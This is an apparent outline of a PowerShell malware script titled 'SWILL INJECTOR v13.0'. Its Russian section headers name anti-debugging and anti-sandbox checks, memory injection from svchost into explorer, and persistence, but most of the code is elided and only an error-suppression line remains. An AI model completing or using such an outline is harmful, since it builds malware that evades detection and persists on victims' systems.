# SWILL INJECTOR v13.0 - HARDCORE EDITION
$ErrorActionPreference='SilentlyContinue'

# === АНТИ-ОТЛАДКА И АНТИ-СЭНДБОКС ===
...
# === ИНЖЕКТ В ПАМЯТЬ (svchost → explorer) ===
$proc=$null
...
# === ПЕРСИСТЕНТНОСТЬ (двойной fallback) ===
